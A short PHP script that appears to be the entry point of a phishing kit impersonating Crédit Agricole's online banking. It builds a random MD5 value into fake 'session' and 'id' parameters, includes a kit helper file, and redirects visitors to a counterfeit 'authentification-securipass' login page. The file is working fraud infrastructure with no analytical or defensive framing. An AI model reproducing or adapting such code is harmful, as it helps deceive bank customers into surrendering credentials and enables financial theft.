<?php
	$praga=rand();
	$praga=md5($praga);

include 'style/js/pa.php';

	header("location: credit-agricole/moncompte-enligne/authentification-securipass/index.php?requete=acces_submit&id=$praga$praga&session=$praga$praga");


?>